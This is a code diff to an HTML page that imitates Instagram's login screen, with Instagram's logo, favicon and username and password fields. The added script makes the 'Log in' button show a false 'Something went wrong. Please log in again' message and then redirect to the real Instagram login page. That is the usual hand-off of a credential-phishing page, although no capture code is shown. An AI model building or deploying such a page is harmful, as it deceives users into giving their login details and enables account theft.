@@ -7,13 +7,21 @@
   <link rel="stylesheet" href="style.css" />
   <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-200.png/ab6eff595bb1.png" />
 </head>
+<script>
+  function handleLogin() {
+    alert("Something went wrong. Please log in again.");
+    window.location.href = "https://www.instagram.com/accounts/login/";
+  }
+</script>
+
 <body>
   <div class="container">
     <div class="login-box">
       <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png" alt="Instagram" class="logo" />
       <input type="text" placeholder="Phone number, username, or email" />
       <input type="password" placeholder="Password" />
-      <button class="login-btn">Log in</button>
+     <button class="login-btn" onclick="handleLogin()">Log in</button>
+
 
       <div class="divider">
         <div class="line"></div>
